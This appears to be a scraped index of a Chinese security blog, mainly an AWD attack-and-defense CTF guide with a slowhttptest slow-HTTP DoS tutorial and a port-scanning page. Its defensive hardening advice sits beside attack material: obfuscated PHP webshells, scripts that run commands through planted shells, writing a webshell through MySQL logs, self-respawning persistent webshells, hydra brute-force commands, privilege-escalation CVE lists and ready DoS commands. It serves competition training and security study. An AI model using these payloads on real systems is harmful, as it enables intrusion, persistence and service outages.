https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse ubuntu 22.04 LTS (jammy) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse ubuntu 23.04 (lunar) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ lunar-proposed main restricted universe multiverse ubuntu 24.04 (noble) 配置如下 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-updates main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-backports main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-backports main restricted universe multiverse # 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-security main restricted universe multiverse deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ noble-proposed main restricted universe multiverse 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-10 14:51 "},"3.网络安全/AWD/AWD-Guide.html":{"url":"3.网络安全/AWD/AWD-Guide.html","title":"AWD Guide","keywords":"","body":"AWD比赛指导手册 https://blog.csdn.net/qq_18741387/article/details/109543511 纸上得来终觉浅,绝知此事要躬行。 手册版本号：V1.2.2-2023/10/21 这是一本能让你从零开始学习AWD并深入AWD的手册，我也会根据经验和需求逐步完善相关内容。如果你要参加AWD相关比赛，相信本项目能给你带来帮助~ 如何在线阅读？ 个人博客地址： https://blog.zgsec.cn/archives/484.html 微信公众号地址：https://mp.weixin.qq.com/s/1vR1rcGHK6YYdXlp4McR_w 如果你觉得本项目不错，欢迎给我点个Star，万分感谢~~ 有什么新的攻击或者防守的姿势、手法，欢迎与我交流 0# 什么是AWD 0.1# AWD赛制介绍 「 攻防模式 | AWD (Attack With Defense) 」 是 CTF比赛 「CTF Capture The Flag」 几种主要的比赛模式之一，该模式常见于线下赛。 在该模式中，每个队伍都拥有一个相同的初始环境 ( 我们称其为 GameBox )，该环境通常运行着一些特定的服务或应用程序，而这些服务通常包含一些安全漏洞。参赛队伍需要挖掘利用对方队伍服务中的安全漏洞，获取 Flag 以获得积分; 同时，参赛队伍也需要修补自身服务漏洞进行防御，以防被其他队伍攻击和获取 Flag。 主要特点为：强调实战性、实时性、对抗性，综合考量竞赛队的渗透能力和防护能力。 0.2# 比赛整体流程 赛前准备环节：我们会分配到多个靶机服务器，通常是分配给我们 SSH 或者 VNC 的用户名和密码，还有相关IP等信息 安全加固环节：我们需要先自己去登录靶机服务器，进行30分钟的安全加固（源码备份/弱口令修改/代码审计和修复/漏洞修复等） 自由攻击环节：安全加固时间过后，开始自由攻击环节，通过对别的队伍的靶机服务器进行攻击（弱口令/Web漏洞/系统漏洞等）获得Flag进行加分，对应队伍失分 1# 比赛环境 通常比赛环境有以下三种情况： 混合靶机情况：运维机器 Windows 10 + 攻击机 Kali Linux + Win靶机 Windows Server 2003/2008/2012 或者 Windows 7 + Linux靶机 Centos7.x 或者 Ubuntu 16.04/17.01/20.04 纯Linux靶机情况：运维机器 Windows 10 + 攻击机 Kali Linux + Linux靶机 Centos7.x 或者 Ubuntu 16.04/17.01/20.04 纯Windows靶机情况：运维机器 Windows 10 + 攻击机 Kali Linux + Win靶机 Windows Server 2003/2008/2012 或者 Windows 7 可能有师傅这里看不太懂，那我可以用大白话描述一下：比赛的时候，会给你1~2台运维机器（一般是Win10里面装了Kali）以及好几台服务器（也就是上面说的靶机），服务器上面有漏洞，要先抓紧去找到漏洞并修复（可别忘了弱口令哦），再通过找到的漏洞去攻击别的队伍的服务器拿到Flag从而得分 2# 安全加固环节（Defense） 2.0# 基本加固流程 2.0.1 Windows加固流程 先备份：Web源码、数据库 445加固，开启防火墙或IP高级安全策略 开启系统日志审计功能 禁用guest账户、关闭文件共享 确保启动项内容是可控的 限制3389远程访问控制的连接数：在本地组策略编辑器里面，依次展开计算机配置-->管理模板-->Windows组件-->远程桌面服务-->远程桌面会话主机-->连接-->限制连接的数量 使用工具监控关键目录文件:文件操作监控.exe、御剑文件监控.exe 恶意代码文件，通过PCHunter、Monitor查找 Web目录环境查找相关可疑文件：jpg/png/rar，查看属性、解压看文件内容 NTFS扫描磁盘查找隐藏的交换流数据 查找系统所有账户信息，禁止非Administrator账户 修改Web站点管理员访问路径、默认口令、数据库口令 安装WAF脚本，防护Web站点，禁止其他漏洞 2.0.2 Linux加固流程 先备份：Web源码、数据库 系统口令修改，团队统一口令 通过 .bash_history 查找历史命令操作，发现痕迹 查看计划任务：crontab -l；编辑计划任务：crontab -e 查看 /etc/init.d/rc.local 中启动服务有无异常 使用脚本开启进程监控、目录监控、流量监控 Web站点口令,站点管理员路径修改 系统加固：iptable 2.1# 基本信息搜集 在防守的时候，信息搜集也很重要，正所谓“知己知彼，百战不殆” 2.1.1 明确Linux机器信息 uname -a //系统信息 ps -aux //查询进程信息 ps -ef | grep 进程名称 //筛选指定进程 id //用于显示用户ID，以及所属群组ID cat /etc/passwd //查看用户情况 ls /home/ //查看用户情况 find / -type d -perm -002 //可写目录检查 ifconfig //Linux上查看网卡信息 ip addr show //Linux上查看网卡信息 2.1.2 明确Windows机器信息 whoami /all //Windows上查看用户详细信息 ipconfig /all //Windows上查看网卡信息 2.1.3 查看开放端口 netstat //查看活动连接 netstat -ano/-a //查看端口情况 netstat -anp //查看端口 firewall-cmd --zone= public --remove-port=80/tcp -permanent //关闭端口 firewall-cmd -reload //防火墙重启 2.1.4 默认口令（弱口令）更改 为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456 还有其他默认密码admin，top100， top1000等 尤其是WEB应用的后台密码修改 passwd username //ssh口令修改 set password for mycms@localhost = password('18ciweufhi28746'); //MySQL密码修改 find /var/www//html -path '*config*’ //查找配置文件中的密码凭证 2.1.5 找本地Flag grep -r \"flag\" /var/www/html/ //Linux：在Web目录下查找flag findstr /s /i \"flag\" *.* //Windows：当前目录以及所有子目录下的所有文件中查找\"flag\"这个字符串 2.1.6 设置禁Ping echo \"1\" > /proc/sys/net/ipv4/icmp_echo_ignore_all //临时开启禁ping echo \"0\" > /proc/sys/net/ipv4/icmp_echo_ignore_all //关闭禁ping 2.2# Web安全加固 2.2.1 备份源码 防止在对源码进行修改时出问题，或者被攻击方删除源码而准备 压缩源码： tar -cvf web.tar /var/www/html zip -q -r web.zip /var/www/html 解压缩源码： tar -xvf web.tar -c /var/www/html unzip web.zip -d /var/www/html 备份源码： mv web.tar /tmp mv web.zip /home/xxx 上传和下载源码： scp username@servername:/path/filename /tmp/local_destination //从服务器下载单个文件到本地 scp /path/local_filename username@servername:/path //从本地上传单个文件到服务器 scp -r username@servername:remote_dir/ /tmp/local_dir //从服务器下载整个目录到本地 scp -r /tmp/local_dir username@servername:remote_dir //从本地上传整个目录到服务器 2.2.2 设置只读权限 对Web文件设置只读和执行权限（PHP等动态语言需要执行权限） chmod 0555 /var/www/html/* chmod 0555 /var/www/html/*.php Web根目录设置只读和执行权限 chmod 0555 /var/www/html 改变文件的属主和属组来设置严格的权限 chown -R root:root /var/www/html/ //设置拥有人为 root:root 或 httpd:httpd (推荐) chown -R apache:apache /var/www/html/ //确保 apache 拥有 /var/www/html/ 2.2.3 配置 .htaccess 利用 .htaccess 配置文件禁止php文件执行 //指定目录后续的指令将应用于该目录 Options -ExecCGI -Indexes //禁用了目录中的 CGI 执行和目录索引（显示目录内容列表）功能。 AllowOverride None //不允许在该目录中使用 .htaccess 文件来覆盖服务器的配置。 RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml //这两个指令移除指定文件扩展名的处理器和类型。 //在这种情况下，这些指令从 Apache 的处理列表中移除了与 PHP 相关的扩展名和服务器端包含（SSI）文件类型。 php_flag engine off //这个指令将 PHP 的引擎标志（engine）设置为关闭状态，从而禁用了在该目录中执行 PHP 脚本的能力。 deny from all //这三行命令使用正则表达式匹配了以 .php、.phtml、.php3、.pht、.php4、.php5、.php7、.shtml 结尾的文件，并将其访问权限设置为拒绝所有 2.2.4 PHP参数安全配置 首先找到PHP的配置文件 /etc/php/{version}/php.ini 禁用高危函数 disable_functions = dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link 配置 open_basedir （将用户访问文件的活动范围限制在指定的区域） open_basedir=/var/www/html 禁用魔术引号（自动对外部来源数据进行转义，防止SQL注入） magic_quotes_gpc = Off 关闭PHP伪协议 allow_url_fopen = Off allow_url_include = Off 重启PHP sudo service php7.0-fpm restart sudo systemctl restart php7.0-fpm.service 2.3# 数据库安全加固 2.3.1 Mysql加固 为了防范弱口令攻击，Mysql密码默认都是root，phpstudy默认密码123456 不使用默认口令，修改成复杂的，并确保和web环境连接 设置只允许本地127.0.0.1账户登录：修改 bind-address=127.0.0.1 ；在配置文件中加入 seccure_file_priv=NULL 开启日志审计功能：general_log_file=路径 因为最常用的是Mysql数据库，所以基本的攻防大部分都是用MySql数据库的命令 备份指定数据库： mysqldump -u username -p password databasename > target.sql 备份所有数据库： mysqldump -all -databases > all.sql 导入数据库： mysql -u username -p password database 对于MySQL的攻防，可以看这篇文章：https://blog.zgsec.cn/archives/26.html MySQL默认配置文件路径： C:\\\\Program Files\\MySQL\\MySQLServer 5.1\\my.ini //Windows /etc/my.cnf //Linux /etc/mysql/my.cnf //Linux 修改 secure_file_priv 参数（日志功能的对应目录） secure_file_priv=\"\" 重载MySQL配置 FLUSH PRIVILEGES 重启MySQL服务 sudo service mysql restart sudo systemctl restart mysql 2.3.2 Mssql加固 删除不必要的账号 SQLServer用户口令安全 根据用户分配帐号避免帐号共享 分配数据库用户所需的最小权限 网络访问限制 SQLServer登录审计 SQLServer安全事件审计 配置日志功能 2.4# 远程控制加固 2.4.1 SSH安全加固 限制IP登录方法 sudo nano /etc/ssh/sshd_config //以root权限编辑SSH配置文件 AllowUsers username@192.168.0.100 //找到并编辑以下行，确保其取消注释并设置为所需的IP地址 禁用 root 远程登录 sudo nano /etc/ssh/sshd_config //以root权限编辑SSH配置文件 PermitRootLogin no //将PermitRootLogi设置为“no” 按用户和组限制SSH登录 sudo nano /etc/ssh/sshd_config //以root权限编辑SSH配置文件 AllowUsers testuser //设置只允许 testuser 登录SSH AllowUsers testuser@192.168.1.100 //设置只允许 192.168.1.100 的机器用 testuser 账户登录SSH AllowGroups test //设置用户组白名单 //需要注意的是：如果同时指定了 AllowUsers 与 AllowGroups 那么必须要在两个选项中都匹配到的用户才能进行SSH登录 重启SSH服务 sudo service sshd restart sudo systemctl restart sshd.service 2.4.2 RDP远程登录安全加固 删除默认帐户并手动添加新用户： 步骤1：按 Win + R 打开运行对话框，输入 secpol.msc 并单击 “确定” 步骤2：导航至此处：本地策略-->用户权限分配，再双击打开 “允许通过远程桌面服务登录” 步骤3：删除此窗口中列出的管理员和远程桌面用户（或计算机上的任何其他用户或组） 步骤4：之后单击 “添加用户或组” 并手动添加您要授予远程桌面访问权限的用户 更改默认RDP端口号： 步骤1：打开运行对话框，输入 regedit 并单击 “确定” 步骤2：打开 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp ，向下滚动并找到 PortNumber 然后双击它 步骤3：选择 “十进制”，修改为您想要设置的端口号，然后单击 “确定” 2.5# 应急响应 2.5.1 查询进程线程 netstat ps -aux netstat -apt 2.5.2 杀掉进程 kill -9 pid //Linux上 taskkill /f /pid pid //Windows上 2.5.3 搜索WebShell文件 find /var/www/html -name *.php -mmin -5 //查看最近5分钟修改文件 find ./ -name '*.php' | xargs wc -l | sort -u //寻找行数最短文件，一般有可能是一句话木马 grep -r --include=*.php '[^a-z]eval($_POST' /var/www/html //查包含关键字的php文件 find /var/www/html -type f -name \"*.php\" | xargs grep \"eval(\" |more //在Linux系统中使用find、grep和xargs命令的组合，用于在指定目录（/var/www/html）下查找所有以.php为扩展名的文件，并搜索这些文件中包含字符串\"eval(\"的行，并使用more命令来分页显示结果以便在输出较长时进行逐页查看 2.5.4 查杀不死马 也可以利用命令自动进行查找删除 ps -aux | grep www-data | grep -v grep | awk '{print $2}' | xargs kill -9 然后重启服务 service php-fpm restart 2.5.5 杀弹反弹shell 老规矩查看进程 ps -ef px -aux ps -aux | grep www-data 注意 www-data 权限的 /bin/sh，很有可能是nc 再就是上老一套命令 kill ps -aux | grep www-data | grep apache2 | awk '{print $2}' 3# 自由攻击环节（Attack） 3.0# 主要准备内容 各类CMS软件包最新版准备 扫描工具：Nmap、Nessus、Metasploit更新 漏洞利用脚本Poc、Exp 3.1# 基本信息搜集 3.1.1 主机信息搜集 Nmap nmap -sn 192.168.0.0/24 //C段存活扫描 httpscan httpscan.py 192.168.0.0/24 -t 10 //C段存活扫描 3.1.2 端口扫描 nmap -sV 192.168.0.2 //扫描主机系统版本 nmap -sS 192.168.0.2 //扫描主机常用端口 nmap -sS -p 80,445 192.168.0.2 //扫描主机部分端口 nmap -sS -p- 192.168.0.2 //扫描主机全部端口 Python脚本 import requests for x in range(2,255): url = \"http://192.168.1.{}\".format(x) try: r = requests.post(url) print(url) except: pass 3.2# 外部打点 3.2.0 常见系统漏洞 MS17-010（永恒之蓝，可看https://blog.zgsec.cn/archives/172.html） MySQL进行UDF提权（SQL注入或者MySQL弱口令） MsSQL进行系统命令执行（SQL注入或者MsSQL弱口令） SSH弱口令或默认口令 PWN（这个要看具体AWD比赛提供的内容了） 3.2.1 中间件漏洞 IIS（解析漏洞、远程代码执行） Apache（解析漏洞） Nginx（解析漏洞） Jboss（CVE-2017-7504/CVE-2017-12149/CVE-2015-7501） Mysql（弱口令） Tomcat（弱口令Getshell） Weblogic（CVE-2020-2551/CVE-2020-2555/CVE-2020-2883） SpringBoot（未授权访问漏洞和RCE漏洞，具体可看https://blog.zgsec.cn/archives/129.html） 3.2.2 集成服务环境漏洞 wampserver xamppserver 3.2.3 CMS漏洞利用 搜集最新版本的CMS，以及对应的漏洞Poc和Exp，这里仅仅列举部分CMS： Aspcms Dedecms Dicuz Drupal Empirecms Eshop Finecms Joomla Lamp Metainfo Phpcms Phpwind Qibocms Seacms Semcms ThinkPHP Wolfcms Wordpress Zabbix 备份文件爆破：使用7kbScan等目录扫描工具对Web系统进行爆破 3.2.4 上传WebShell 常见一句话木马 PHP： Aspx： Get型木马 免杀马制作：https://github.com/AabyssZG/WebShell-Bypass-Guide /'^'{{{{';@${$_}[_](@${$_}[__]); //执行GET传参 ?_=system&__=whoami 来执行whoami命令 /'^'{{{{';$___='$+4(/' ^ '{{{{{';@${$_}[_](@${$___}[__]); //执行GET传参 ?_=assert 和POST传参 __=PHP代码来GetShell 隐藏的文件读取 条件允许的话，将flag信息直接读取并返回到header头中，这样做不易被发现 3.2.5 利用WebShell curl(跟hackbar差不多) C:\\Users\\admin>curl \"http://192.168.182.130:8801/include/shell.php\" -d \"admin_ccmd=system('cat /f*');\" //向shell.php文件里传入参数并返回结果 Python多端口传参 #coding=utf-8 import requests url_head=\"http://192.168.182.130\" #网段 url=\"\" shell_addr=\"/upload/url/shell.php\" #木马路径 passwd=\"pass\" #木马密码 #port=\"80\" payload = {passwd: 'System(\\'cat /flag\\');'} # find / -name \"flag*\" #清空上次记录 flag=open(\"flag.txt\",\"w\") flag.close() flag=open(\"flag.txt\",\"a\") for i in range(8000,8004): url=url_head+\":\"+str(i)+shell_addr try: res=requests.post(url,payload)#,timeout=1 if res.status_code == requests.codes.ok: result = res.text print (result) flag.write(result+\"\\n\") else: print (\"shell 404\") except: print (url+\" connect shell fail\") flag.close() 3.2.6 MySQL数据库利用 具体可以看这篇文章：https://blog.zgsec.cn/archives/26.html 1、查看MySQL版本 show variables like '%version%'; select version(); #这个只显示MySQL版本号 2、查看 load_file() 开启状态 show variables like '%secure%'; #这条可查看详细信息 show global variables like '%secure_file_priv%'; 3、查看日志功能是否开启和对应目录 SHOW VARIABLES LIKE 'general%'; set global general_log = \"ON\"; set global general_log_file='/var/www/html/test.php'; #可以写入WebShell然后直接连接蚁剑 # 往日志里面写入 WebShell select ''; # 此时已经写到 test.php 文件当中了，注意这个要知道网站的具体路径才可以实现 小技巧：获取MySQL账户和对应密码Hash # MySQL = 5.7 版本 select host,user,authentication_string from mysql.user; 3.2.7 弱口令爆破 爆破SSH密码 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ssh hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100 hydra -L 用户名字典.txt -P 密码字典.txt ssh://192.168.1.100 -s 40 //40是⽬标服务开放的端⼝ 爆破FTP密码 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 ftp hydra -L 用户名字典.txt -P 密码字典.txt ftp://192.168.1.100/ 爆破RDP远程桌面密码 hydra 目标IP地址 rdp -l administrator -P 密码字典.txt -V 爆破Telnet hydra 目标IP地址 telnet -l 用户字典.txt -P 密码字典.txt -f -V 爆破MSSQL数据库 hydra -l sa -P 密码字典.txt 目标IP地址 mssql 爆破MySQL数据库 hydra -L 用户名字典.txt -P 密码字典.txt 目标IP地址 mysql 3.3# 内网渗透 3.3.1 权限维持之不死马 简单不死马： '); //创建shell.php sleep(0); //间隔时间 } 可以通过不断复写 shell.php 来达到该木马难以被使用的效果 防连接不死马： '); //创建shell.php sleep(0); } //passwd=AabyssTeam //POST传参：passwd=AabyssTeam&cmd=system('ls'); 进阶不死马： '; while (1){ file_put_contents($file,$code); system('touch -m -d \"2020-12-01 09:10:12\" shell.php'); //修改时间，防止被删 usleep(5000); } ?> //passwd=AabyssTeam //POST传参：passwd=AabyssTeam&cmd=system('ls'); 将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为 shell.php 的WebShell文件 双重不死马： '; while (1){ file_put_contents($file,$code); system('touch -m -d \"2020-12-01 18:10:12\" .login.php'); file_put_contents($file1,$code); system('touch -m -d \"2020-12-01 18:10:12\" /admin/.register.php'); usleep(5000); } ?> //passwd=AabyssTeam //POST传参：passwd=AabyssTeam&cmd=system('ls'); 浏览器访问写入的WebShell，会自动生成两个不死马： .login.php 和 /admin/.register.php 3.3.2 关键文件检索 组件检索 find / -name \"apaech2.conf\" //检索Apache主配置文件 find / -name \"nginx.conf\" //检索Nginx目录 find / -path \"*nginx*\" -name nginx*conf //检索Nginx配置目录 find / -name \"httpd.conf\" //检索Apache目录 find / -path \"*apache*\" -name apache*conf //检索Apache配置目录 网站首页 find / -name \"index.php\" //定位网站目录 find / -name \"index.html\" //定位网站目录 日志文件检索 /var/log/nginx/ //默认Nginx日志目录 /var/log/apache/ //默认Apache日志目录 /var/log/apache2/ //默认Apache日志目录 /usr/local/tomcat/logs //Tomcat日志目录 tail -f xxx.log //实时刷新滚动日志文件 3.3.3 Linux提权 查询系统版本信息命令： cat /etc/issue cat /etc/*-release cat /etc/lsb-release cat /etc/redhat-release 查询内核版本信息命令： uname -a uname -mrs cat /proc/version cat /etc/issue lsb_release -a hostnamectl rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz 查看系统环境变量命令： cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set 查看语言环境信息命令： find / -name perl* find / -name python* find / -name gcc* find / -name cc set 查看文件上传环境信息命令： find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp 这里列举一些可用利用的提权漏洞： CVE-2023-0386（Linux OverlayFS权限提升漏洞） CVE-2021-4034（Linux Polkit本地权限提升漏洞） CVE-2017-6074 （DCCP双重释放漏洞 > 2.6.18 ） CVE-2016-5195（脏牛，kernel 2.6.22 CVE-2016-8655（Ubuntu 12.04、14.04，Debian 7、8） CVE-2017-1000367（sudo本地提权漏洞 ） CVE-2016-1247（Nginx权限提升漏洞） CVE-2017-16995（Ubuntu16.04 kernel:4.14-4.4） Kali命令查询： searchsploit CentOS 7 searchsploit Ubuntu 16.04 提权Exploit寻找： http://www.exploit-db.com http://metasploit.com/modules/ http://securityreason.com http://seclists.org/fulldisclosure/ https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/tree/main 编译提权Exp gcc -o /usr/share/nginx/html/***** /usr/share/nginx/html/*****.c -Wall 直接提权，确认权限： cat /etc/shadow 其他提权姿势：https://www.freebuf.com/articles/system/244627.html 3.3.4 Windows提权 这里列举一些Windows的漏洞： 各种Potato（Github上面基本都有） CVE-2023-35359（Windows内核权限提升漏洞，开源了） CVE-2022-24521（没有Exp的可以找我要） CVE-2019-1405 CVE-2019-1322 MS17-017（整型溢出漏洞） 4# 参考链接 http://freebuf.com/ https://blog.zgsec.cn/ https://paper.seebug.org/3044/ https://www.anquanke.com/ https://www.exploit-db.com/ http://www.bugscan.net/source/template/vulns/ https://xz.aliyun.com/t/12687 5# 感谢各位师傅🙏 Stargazers Forkers 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 17:04 "},"3.网络安全/AWD/slowhttptest.html":{"url":"3.网络安全/AWD/slowhttptest.html","title":"Slowhttptest","keywords":"","body":"slowhttptest慢速攻击工具使用详解 参考文章 浅谈“慢速HTTP攻击Slow HTTP Attack” HTTP慢速攻击 Slowhttptest攻击原理 InstallationAndUsage 本片文章仅供学习使用，切勿触犯法律！ 一、简要介绍 SlowHTTPTest是一款对服务器进行慢攻击的测试软件，所谓的慢攻击就是相对于cc或者DDoS的快而言的，并不是只有量大速度快才能把服务器搞挂，使用慢攻击有时候也能到达同一效果。slowhttptest包含了之前几种慢攻击的攻击方式，包括slowloris, Slow HTTP POST, Slow Read attack等。那么这些慢攻击工具的原理就是想办法让服务器等待，当服务器在保持连接等待时，自然就消耗了资源。 二、下载安装 Kali Linux： apt-get install slowhttptest 其他Linux发行版： tar -xzvf slowhttptest-x.x.tar.gz cd slowhttptest-x.x ./configure --prefix=PREFIX make sudo make install PREFIX替换为应该安装slowhttptest工具的绝对路径。 需要安装libssl-dev才能成功编译该工具。 MacOS安装命令： brew update && brew install slowhttptest git安装： git clone https://github.com/shekyan/slowhttptest 三、执行使用 默认参数测试 ./slowhttptest 其回应的相关参数： test type 测试类型 number of connections 连接数 URL 网址 verb 动词 interval between follow up data 随机数据之间的间隔 connections per second 每秒连接数 test duration 测试时间 probe connection timeout 探针连接超时 max length of followup data field 后续数据字段的最大长度 1、参数说明 选项 描述 -a 开始 用于范围标头测试的range-specifier的起始值 -b 字节 范围标题测试的范围说明符限制 -c 连接数 限于65539 -d 代理主机：端口 通过Web代理定向所有流量 -e 代理主机：端口 用于仅通过Web代理定向探测流量 -H，B，R或X 指定在标头部分或消息正文中放慢速度，-R启用范围测试，-X启用慢速读取测试 -f 内容类型 内容类型标头的值 -g 生成CSV和HTML格式的统计信息，格式为slow_xxx.csv / html，其中xxx是时间和日期 -i 秒 每个连接的后续数据之间的间隔（以秒为单位） -j cookie Cookie标头的值（例如：-j“ user_id = 1001；超时= 9000”） -k 流水线系数 如果服务器支持HTTP管道，则在同一连接中重复请求以进行慢速读取测试的次数。 -l 秒 测试持续时间（以秒为单位） -m 接受 Accept标头的值 -n 秒 从接收缓冲区读取操作之间的间隔 -o 文件 定制输出文件的路径和/或名称，如果指定了-g，则有效 -p 秒 等待探针连接上的HTTP响应超时，此后服务器被视为不可访问 每秒-r个连接 连接率 -s 字节 如果指定了-B，则Content-Length标头的值 -t 动词 要使用的自定义动词 -u URL 目标URL，与您在浏览器中键入的格式相同，例如http s：// host [：port] / -v 级 日志0-4的详细级别 -w 字节 范围的开始，将从中选择广告窗口大小 -x 字节 随访数据的最大长度 -y 字节 范围的末端，将从中选择广告窗口大小 -z 字节 通过单个read（）操作从接收缓冲区读取的字节 2、功能命令 slowloris模式： slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u https://yourtarget.com/index.html -x 24 -p 3 Slow Body攻击： 慢消息正文模式下的用法示例 slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://www.mywebsite.com -x 10 -p 3 Slow Read模式： slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://yourtarget.co 慢节奏模式下的用法示例： ./slowhttptest -c 1000 -H -g -o my_header_stats -i 10 -r 200 -t GET -u https://myseceureserver/resources/index.html -x 24 -p 3 通过在xxxx：8080上的代理进行探测： ./slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://someserver/somebigresource -p 5 -l 350 -e x.x.x.x:8080 3、错误信息 错误信息 这是什么意思 \"Hit test time limit\" 程序达到了用-l参数指定的时间限制 \"No open connections left\" 同行关闭了所有连接 \"Cannot establish connection\" 在测试的前N秒内未建立任何连接，其中N是-i参数的值，或者是10（如果未指定）。如果没有到主机的路由或远程对等体断开，则会发生这种情况 \"Connection refused\" 远程对等方不接受指定端口上的连接（仅来自您？使用代理进行探测） \"Cancelled by user\" 您按了Ctrl-C或以其他方式发送了SIGINT \"Unexpected error\" 永远不会发生 3、判断依据 当服务器可控，可以通过以下命令来确认是否存在该漏洞： pgrep http | wc -l 进程数量 netstat -antp | grep 443 | wc -l 网络连接数量 在攻击的时间段，服务无法正常访问则存在漏洞。 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"3.网络安全/AWD/主机端口探测.html":{"url":"3.网络安全/AWD/主机端口探测.html","title":"主机端口探测","keywords":"","body":"主机探测 一般使用nmap或httpscan 查看自己主机IP： ifconfig #Linux ipconfig #Windows 扫描C段存活： namp -sn 192.168.0.0/24 #扫描C段主机存活 httpscan.py 192.168.0.0/24 –t 10 #扫描C段主机存活 端口探测 一般先搜集自己的主机端口信息，比赛主机开放端口情况大多情况一致，然后类比指定扫描其他主机端口信息，最后挂后台全端口扫描防止端口遗漏！ nmap -sV 192.168.0.2 #扫描主机系统版本 nmap -sS 192.168.0.2 #扫描主机常用端口 nmap -sS -p 80,445 192.168.0.2 #扫描主机部分端口 nmap -sS -p- 